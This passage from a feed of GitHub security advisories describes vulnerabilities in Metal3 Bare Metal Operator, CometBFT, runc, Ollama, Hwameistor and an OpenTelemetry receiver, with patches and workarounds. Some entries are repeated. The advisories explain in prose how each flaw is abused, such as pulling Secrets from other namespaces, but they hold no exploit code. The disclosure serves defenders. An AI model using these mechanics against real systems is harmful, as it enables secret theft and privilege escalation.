href=\"https://github.com/metal3-io/baremetal-operator/pull/1929\">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1930\">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1931\">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pqfh-xh7w-7h3p\">https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pqfh-xh7w-7h3p",
            "title": "[github.com/metal3-io/baremetal-operator] The Bare Metal Operator (BMO) can expose particularly named secrets from other namespaces via BMH CRD",
            "date_modified": "2024-09-03T21:45:29.000Z",
            "date_published": "2024-09-03T20:13:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pqfh-xh7w-7h3p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Bare Metal Operator (BMO) implements a Kubernetes API for managing bare metal hosts in Metal3. The <code>BareMetalHost</code> (BMH) CRD allows the <code>userData</code>, <code>metaData</code>, and <code>networkData</code> for the provisioned host to be specified as links to Kubernetes Secrets. There are fields for both the <code>Name</code> and <code>Namespace</code> of the Secret, meaning that the baremetal-operator will read a <code>Secret</code> from any namespace. A user with access to create or edit a <code>BareMetalHost</code> can thus exfiltrate a <code>Secret</code> from another namespace by using it as e.g. the <code>userData</code> for provisioning some host (note that this need not be a real host, it could be a VM somewhere).</p>\n<h3 id=\"limiting-factors\">Limiting factors</h3>\n<p>BMO will only read a key with the name <code>value</code> (or <code>userData</code>, <code>metaData</code>, or <code>networkData</code>), so that limits the exposure somewhat. <code>value</code> is probably a pretty common key though. Secrets used by <em>other</em> <code>BareMetalHost</code>s in different namespaces are always vulnerable.</p>\n<p>It is probably relatively unusual for anyone other than cluster administrators to have RBAC access to create/edit a <code>BareMetalHost</code>. This vulnerability is only meaningful, if the cluster has users other than administrators and users' privileges are limited to their respective namespaces.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The patch prevents BMO from accepting links to Secrets from other namespaces as BMH input. Any BMH configuration is only read from the same namespace only.</p>\n<p>The problem is patched in BMO releases v0.8.0, v0.6.2 and v0.5.2 and users should upgrade to those versions. Prior upgrading and if needed, duplicate the BMC Secrets to the namespace where the corresponding BMH is. After upgrade, remove the old Secrets.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Operator can configure BMO RBAC to be namespace scoped for Secrets, instead of cluster scoped, to prevent BMO from accessing Secrets from other namespaces.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43803\">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1929\">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1930\">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1931\">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p\">https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-pqfh-xh7w-7h3p</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74\">https://github.com/metal3-io/baremetal-operator/commit/3af4882e9c5fadc1a7550f53daea21dccd271f74</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb\">https://github.com/metal3-io/baremetal-operator/commit/bedae7b997d16f36e772806681569bb8eb4dadbb</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7\">https://github.com/metal3-io/baremetal-operator/commit/c2b5a557641bc273367635124047d6c958aa15f7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43803\">https://nvd.nist.gov/vuln/detail/CVE-2024-43803</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1929\">https://github.com/metal3-io/baremetal-operator/pull/1929</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1930\">https://github.com/metal3-io/baremetal-operator/pull/1930</a></li>\n<li><a href=\"https://github.com/metal3-io/baremetal-operator/pull/1931\">https://github.com/metal3-io/baremetal-operator/pull/1931</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pqfh-xh7w-7h3p\">https://github.com/advisories/GHSA-pqfh-xh7w-7h3p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pqfh-xh7w-7h3p",
            "title": "[github.com/metal3-io/baremetal-operator] The Bare Metal Operator (BMO) can expose particularly named secrets from other namespaces via BMH CRD",
            "date_modified": "2024-09-03T21:45:29.000Z",
            "date_published": "2024-09-03T20:13:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pqfh-xh7w-7h3p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Name</strong>: ASA-2024-009: State syncing validator from malicious node may lead to a chain split\n<strong>Component</strong>: CometBFT\n<strong>Criticality</strong>: Medium (<a href=\"https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md\">ACMv1.2</a>: I:Moderate; L: Possible)\n<strong>Affected versions</strong>: &gt;= 0.34.0, &lt;= 0.34.33, &gt;=0.37.0, &lt;= 0.37.10, &gt;= 0.38.0, &lt;= 0.38.11</p>\n<h3 id=\"summary\">Summary</h3>\n<p>The state sync protocol retrieves a snapshot of the application and installs it in a fresh node. In order for this node to be ready to run consensus and block sync from the installed snapshot height, we also need to install a valid <code>State</code> in the node, which is the starting state from which it is able to validate new blocks and append them to the blockchain.</p>\n<p>The <code>State</code> object used by state sync is computed using the light client protocol, which retrieves information about committed blocks from at least two RPC endpoints. The light client protocol performs several state validations and, in particular, compares the state provided by different RPC endpoints, looking for inconsistencies.</p>\n<p>The <code>State</code> object contains, among other fields, a <code>Validators</code> field which stores the current validator set. A validator set is a list of validator addresses, public keys and associated voting powers, one per validator. It also stores, for historical reasons, the state of the proposer selection algorithm, in the form of the <code>ProposerPriority</code> field associated with each <code>Validator</code>.</p>\n<p>While the light client is able to validate the <code>ValidatorSet</code> retrieved from RPC endpoints, this validation does not include the <code>ProposerPriority</code> field associated with each <code>Validator</code>. As a result, when state sync adopts RPC endpoints that, for unknown reasons, provide an invalid state of the proposer selection algorithm, the node will not be able to properly run the consensus protocol, as their local view of which validator is the proposer of a given round and height will disagree with the views of the correct validators. If an increasing number of validators state sync using RPC endpoints with invalid states, the network eventually halts.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Release versions 0.34.34, 0.37.11, and 0.38.12 include a patch to address this issue.</p>\n<p>In the patched versions, the light client protocol compares the <code>ProposerPriority</code> fields of the <code>ValidatorSet</code> instances retrieved from the RPC endpoints configured for state sync. If they differ, the computed <code>State</code> object is considered invalid and state sync will fail with an error.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The issue is observed when validators run state sync using RPC nodes that are malicious or report invalid states for the proposer selection algorithm.</p>\n<p>It is worth noting that non-malicious nodes running upstream software should never report an invalid state for the proposer selection algorithm. This situation may result from the adoption of nodes with customized code or which had their state, stored in local databases, manually updated.</p>\n<p>When the network public's RPC endpoints have an invalid state for the proposer election algorithm, there, new validators should refrain from using state sync for bootstrapping or be sure that they configure for state sync RPC endpoints with a valid state of the proposer election algorithm.</p>\n<p>A validator with an invalid state for the proposer selection algorithm will reject most of the proposed blocks and will have the network rejecting blocks it has proposed.  It is also possible to manually compare the state of the proposer election algorithm of nodes by comparing the outputs of the <code>/validators?height=_</code>  RPC endpoints. The outputs must fully match, including the ProposerPriority field associated with each validator. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://docs.cometbft.com/v0.38/core/state-sync\">State Sync documentation</a></li>\n</ul>\n<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 12/08/24. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href=\"mailto:security@interchain.io\">security@interchain.io</a>.</p>\n<p>For more information about CometBFT, please see <a href=\"https://docs.cometbft.com/\">https://docs.cometbft.com/</a>.</p>\n<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href=\"https://github.com/interchainio/security\">https://github.com/interchainio/security</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc\">https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2\">https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55\">https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g5xx-c4hv-9ccc\">https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g5xx-c4hv-9ccc",
            "title": "[github.com/cometbft/cometbft/light] CometBFT's state syncing validator from malicious node may lead to a chain split",
            "date_modified": "2024-09-03T20:03:10.000Z",
            "date_published": "2024-09-03T20:03:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g5xx-c4hv-9ccc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Name</strong>: ASA-2024-009: State syncing validator from malicious node may lead to a chain split\n<strong>Component</strong>: CometBFT\n<strong>Criticality</strong>: Medium (<a href=\"https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md\">ACMv1.2</a>: I:Moderate; L: Possible)\n<strong>Affected versions</strong>: &gt;= 0.34.0, &lt;= 0.34.33, &gt;=0.37.0, &lt;= 0.37.10, &gt;= 0.38.0, &lt;= 0.38.11</p>\n<h3 id=\"summary\">Summary</h3>\n<p>The state sync protocol retrieves a snapshot of the application and installs it in a fresh node. In order for this node to be ready to run consensus and block sync from the installed snapshot height, we also need to install a valid <code>State</code> in the node, which is the starting state from which it is able to validate new blocks and append them to the blockchain.</p>\n<p>The <code>State</code> object used by state sync is computed using the light client protocol, which retrieves information about committed blocks from at least two RPC endpoints. The light client protocol performs several state validations and, in particular, compares the state provided by different RPC endpoints, looking for inconsistencies.</p>\n<p>The <code>State</code> object contains, among other fields, a <code>Validators</code> field which stores the current validator set. A validator set is a list of validator addresses, public keys and associated voting powers, one per validator. It also stores, for historical reasons, the state of the proposer selection algorithm, in the form of the <code>ProposerPriority</code> field associated with each <code>Validator</code>.</p>\n<p>While the light client is able to validate the <code>ValidatorSet</code> retrieved from RPC endpoints, this validation does not include the <code>ProposerPriority</code> field associated with each <code>Validator</code>. As a result, when state sync adopts RPC endpoints that, for unknown reasons, provide an invalid state of the proposer selection algorithm, the node will not be able to properly run the consensus protocol, as their local view of which validator is the proposer of a given round and height will disagree with the views of the correct validators. If an increasing number of validators state sync using RPC endpoints with invalid states, the network eventually halts.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Release versions 0.34.34, 0.37.11, and 0.38.12 include a patch to address this issue.</p>\n<p>In the patched versions, the light client protocol compares the <code>ProposerPriority</code> fields of the <code>ValidatorSet</code> instances retrieved from the RPC endpoints configured for state sync. If they differ, the computed <code>State</code> object is considered invalid and state sync will fail with an error.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The issue is observed when validators run state sync using RPC nodes that are malicious or report invalid states for the proposer selection algorithm.</p>\n<p>It is worth noting that non-malicious nodes running upstream software should never report an invalid state for the proposer selection algorithm. This situation may result from the adoption of nodes with customized code or which had their state, stored in local databases, manually updated.</p>\n<p>When the network public's RPC endpoints have an invalid state for the proposer election algorithm, there, new validators should refrain from using state sync for bootstrapping or be sure that they configure for state sync RPC endpoints with a valid state of the proposer election algorithm.</p>\n<p>A validator with an invalid state for the proposer selection algorithm will reject most of the proposed blocks and will have the network rejecting blocks it has proposed.  It is also possible to manually compare the state of the proposer election algorithm of nodes by comparing the outputs of the <code>/validators?height=_</code>  RPC endpoints. The outputs must fully match, including the ProposerPriority field associated with each validator. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://docs.cometbft.com/v0.38/core/state-sync\">State Sync documentation</a></li>\n</ul>\n<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 12/08/24. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href=\"mailto:security@interchain.io\">security@interchain.io</a>.</p>\n<p>For more information about CometBFT, please see <a href=\"https://docs.cometbft.com/\">https://docs.cometbft.com/</a>.</p>\n<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href=\"https://github.com/interchainio/security\">https://github.com/interchainio/security</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc\">https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2\">https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55\">https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g5xx-c4hv-9ccc\">https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g5xx-c4hv-9ccc",
            "title": "[github.com/cometbft/cometbft/light] CometBFT's state syncing validator from malicious node may lead to a chain split",
            "date_modified": "2024-09-03T20:03:10.000Z",
            "date_published": "2024-09-03T20:03:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g5xx-c4hv-9ccc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Name</strong>: ASA-2024-009: State syncing validator from malicious node may lead to a chain split\n<strong>Component</strong>: CometBFT\n<strong>Criticality</strong>: Medium (<a href=\"https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md\">ACMv1.2</a>: I:Moderate; L: Possible)\n<strong>Affected versions</strong>: &gt;= 0.34.0, &lt;= 0.34.33, &gt;=0.37.0, &lt;= 0.37.10, &gt;= 0.38.0, &lt;= 0.38.11</p>\n<h3 id=\"summary\">Summary</h3>\n<p>The state sync protocol retrieves a snapshot of the application and installs it in a fresh node. In order for this node to be ready to run consensus and block sync from the installed snapshot height, we also need to install a valid <code>State</code> in the node, which is the starting state from which it is able to validate new blocks and append them to the blockchain.</p>\n<p>The <code>State</code> object used by state sync is computed using the light client protocol, which retrieves information about committed blocks from at least two RPC endpoints. The light client protocol performs several state validations and, in particular, compares the state provided by different RPC endpoints, looking for inconsistencies.</p>\n<p>The <code>State</code> object contains, among other fields, a <code>Validators</code> field which stores the current validator set. A validator set is a list of validator addresses, public keys and associated voting powers, one per validator. It also stores, for historical reasons, the state of the proposer selection algorithm, in the form of the <code>ProposerPriority</code> field associated with each <code>Validator</code>.</p>\n<p>While the light client is able to validate the <code>ValidatorSet</code> retrieved from RPC endpoints, this validation does not include the <code>ProposerPriority</code> field associated with each <code>Validator</code>. As a result, when state sync adopts RPC endpoints that, for unknown reasons, provide an invalid state of the proposer selection algorithm, the node will not be able to properly run the consensus protocol, as their local view of which validator is the proposer of a given round and height will disagree with the views of the correct validators. If an increasing number of validators state sync using RPC endpoints with invalid states, the network eventually halts.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Release versions 0.34.34, 0.37.11, and 0.38.12 include a patch to address this issue.</p>\n<p>In the patched versions, the light client protocol compares the <code>ProposerPriority</code> fields of the <code>ValidatorSet</code> instances retrieved from the RPC endpoints configured for state sync. If they differ, the computed <code>State</code> object is considered invalid and state sync will fail with an error.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The issue is observed when validators run state sync using RPC nodes that are malicious or report invalid states for the proposer selection algorithm.</p>\n<p>It is worth noting that non-malicious nodes running upstream software should never report an invalid state for the proposer selection algorithm. This situation may result from the adoption of nodes with customized code or which had their state, stored in local databases, manually updated.</p>\n<p>When the network public's RPC endpoints have an invalid state for the proposer election algorithm, there, new validators should refrain from using state sync for bootstrapping or be sure that they configure for state sync RPC endpoints with a valid state of the proposer election algorithm.</p>\n<p>A validator with an invalid state for the proposer selection algorithm will reject most of the proposed blocks and will have the network rejecting blocks it has proposed.  It is also possible to manually compare the state of the proposer election algorithm of nodes by comparing the outputs of the <code>/validators?height=_</code>  RPC endpoints. The outputs must fully match, including the ProposerPriority field associated with each validator. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://docs.cometbft.com/v0.38/core/state-sync\">State Sync documentation</a></li>\n</ul>\n<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 12/08/24. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href=\"mailto:security@interchain.io\">security@interchain.io</a>.</p>\n<p>For more information about CometBFT, please see <a href=\"https://docs.cometbft.com/\">https://docs.cometbft.com/</a>.</p>\n<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href=\"https://github.com/interchainio/security\">https://github.com/interchainio/security</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc\">https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2\">https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55\">https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g5xx-c4hv-9ccc\">https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g5xx-c4hv-9ccc",
            "title": "[github.com/cometbft/cometbft/light] CometBFT's state syncing validator from malicious node may lead to a chain split",
            "date_modified": "2024-09-03T20:03:10.000Z",
            "date_published": "2024-09-03T20:03:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g5xx-c4hv-9ccc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>runc 1.1.13 and earlier as well as 1.2.0-rc2 and earlier can be tricked into\ncreating empty files or directories in arbitrary locations in the host\nfilesystem by sharing a volume between two containers and exploiting a race\nwith os.MkdirAll. While this can be used to create empty files, existing\nfiles <strong>will not</strong> be truncated.</p>\n<p>An attacker must have the ability to start containers using some kind of custom\nvolume configuration. Containers using user namespaces are still affected, but\nthe scope of places an attacker can create inodes can be significantly reduced.\nSufficiently strict LSM policies (SELinux/Apparmor) can also in principle block\nthis attack -- we suspect the industry standard SELinux policy may restrict\nthis attack's scope but the exact scope of protection hasn't been analysed.</p>\n<p>This is exploitable using runc directly as well as through Docker and\nKubernetes.</p>\n<p>The CVSS score for this vulnerability is\nCVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N (Low severity, 3.6).</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Using user namespaces restricts this attack fairly significantly such that the\nattacker can only create inodes in directories that the remapped root\nuser/group has write access to. Unless the root user is remapped to an actual\nuser on the host (such as with rootless containers that don't use\n/etc/sub[ug]id), this in practice means that an attacker would only be able to\ncreate inodes in world-writable directories.</p>\n<p>A strict enough SELinux or AppArmor policy could in principle also restrict the\nscope if a specific label is applied to the runc runtime, though we haven't\nthoroughly tested to what extent the standard existing policies block this\nattack nor what exact policies are needed to sufficiently restrict this attack.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in runc v1.1.14 and v1.2.0-rc3.</p>\n<ul>\n<li><code>main</code> patches:<ul>\n<li><a href=\"https://github.com/opencontainers/runc/pull/4359\">https://github.com/opencontainers/runc/pull/4359</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7\">https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7</a></li>\n</ul>\n</li>\n<li><code>release-1.1</code> patches:<ul>\n<li><a href=\"https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e\">https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf\">https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Rodrigo Campos Catelin (@rata) and Alban Crequy (@alban) from\nMicrosoft for discovering and reporting this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/opencontainers/runc/security/advisories/GHSA-jfvp-7x6p-h2pv\">https://github.com/opencontainers/runc/security/advisories/GHSA-jfvp-7x6p-h2pv</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/pull/4359\">https://github.com/opencontainers/runc/pull/4359</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7\">https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e\">https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf\">https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45310\">https://nvd.nist.gov/vuln/detail/CVE-2024-45310</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jfvp-7x6p-h2pv\">https://github.com/advisories/GHSA-jfvp-7x6p-h2pv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jfvp-7x6p-h2pv",
            "title": "[github.com/opencontainers/runc] runc can be confused to create empty files/directories on the host",
            "date_modified": "2024-09-05T14:04:57.000Z",
            "date_published": "2024-09-03T19:49:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jfvp-7x6p-h2pv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>extractFromZipFile</code> in <code>model.go</code> in Ollama before 0.1.47 can extract members of a ZIP archive outside of the parent directory.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45436\">https://nvd.nist.gov/vuln/detail/CVE-2024-45436</a></li>\n<li><a href=\"https://github.com/ollama/ollama/pull/5314\">https://github.com/ollama/ollama/pull/5314</a></li>\n<li><a href=\"https://github.com/ollama/ollama/compare/v0.1.46...v0.1.47\">https://github.com/ollama/ollama/compare/v0.1.46...v0.1.47</a></li>\n<li><a href=\"https://github.com/ollama/ollama/commit/123a722a6f541e300bc8e34297ac378ebe23f527\">https://github.com/ollama/ollama/commit/123a722a6f541e300bc8e34297ac378ebe23f527</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-846m-99qv-67mg\">https://github.com/advisories/GHSA-846m-99qv-67mg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-846m-99qv-67mg",
            "title": "[github.com/ollama/ollama] Ollama can extract members of a ZIP archive outside of the parent directory",
            "date_modified": "2024-08-29T18:05:19.000Z",
            "date_published": "2024-08-29T03:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-846m-99qv-67mg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em>\nThis ClusterRole has * verbs of * resources. If a malicious user can access the worker node which has hwameistor's deployment, he/she can abuse these excessive permissions to do whatever he/she likes to the whole cluster, resulting in a cluster-level privilege escalation.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<blockquote>\n<p>= v0.14.6</p>\n</blockquote>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\nUpdate and Limit the ClusterRole using <a href=\"https://github.com/hwameistor/hwameistor/blob/main/helm/hwameistor/templates/clusterrole.yaml\">security-role</a>.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em>\nissues:\n<a href=\"https://github.com/hwameistor/hwameistor/issues/1457\">https://github.com/hwameistor/hwameistor/issues/1457</a>\n<a href=\"https://github.com/hwameistor/hwameistor/issues/1460\">https://github.com/hwameistor/hwameistor/issues/1460</a></p>\n<p>also reported by users via mails: \n<a href=\"https://github.com/sparkEchooo\">sparkEchooo</a>, <a href=\"https://github.com/younaman\">younaman</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/hwameistor/hwameistor/security/advisories/GHSA-mgwr-h7mv-fh29\">https://github.com/hwameistor/hwameistor/security/advisories/GHSA-mgwr-h7mv-fh29</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45054\">https://nvd.nist.gov/vuln/detail/CVE-2024-45054</a></li>\n<li><a href=\"https://github.com/hwameistor/hwameistor/issues/1457\">https://github.com/hwameistor/hwameistor/issues/1457</a></li>\n<li><a href=\"https://github.com/hwameistor/hwameistor/issues/1460\">https://github.com/hwameistor/hwameistor/issues/1460</a></li>\n<li><a href=\"https://github.com/hwameistor/hwameistor/commit/edf4cebed73cadd230bf97eab65c5311f2858450\">https://github.com/hwameistor/hwameistor/commit/edf4cebed73cadd230bf97eab65c5311f2858450</a></li>\n<li><a href=\"https://github.com/hwameistor/hwameistor/blob/main/helm/hwameistor/templates/clusterrole.yaml\">https://github.com/hwameistor/hwameistor/blob/main/helm/hwameistor/templates/clusterrole.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mgwr-h7mv-fh29\">https://github.com/advisories/GHSA-mgwr-h7mv-fh29</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mgwr-h7mv-fh29",
            "title": "[github.com/hwameistor/hwameistor] Hwameistor Potential Permission Leakage of Cluster Level ",
            "date_modified": "2024-08-29T18:00:47.000Z",
            "date_published": "2024-08-29T18:00:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mgwr-h7mv-fh29"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>OpenTelemetry Collector module <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/awsfirehosereceiver\"><code>awsfirehosereceiver</code></a> allows unauthenticated remote requests, even when configured to require a key.</p>\n<p>OpenTelemetry Collector can be configured to receive CloudWatch metrics via an AWS Firehose Stream. <a href=\"https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html\">Firehose sets the header</a> <code>X-Amz-Firehose-Access-Key</code> with an arbitrary configured string. The OpenTelemetry Collector awsfirehosereceiver can optionally be configured to require this key on incoming requests. However, when this is configured it <strong>still accepts incoming requests with no key</strong>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only OpenTelemetry Collector users configured with the “<a href=\"https://github.com/open-telemetry/opentelemetry-collector#alpha\">alpha</a>” <code>awsfirehosereceiver</code> module are affected. This module was <a href=\"https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74\">added</a> in version v0.49.0 of the <a href=\"https://github.com/open-telemetry/opentelemetry-collector-releases/tree/main/distributions/otelcol-contrib\">“Contrib” distribution</a> (or may be included in custom builds).</p>\n<p>There is a risk of unauthorized users writing metrics. Carefully crafted metrics could hide other malicious activity. There is no risk of exfiltrating data. It’s likely these endpoints will be exposed to the public internet, as Firehose <a href=\"https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-http\">does not 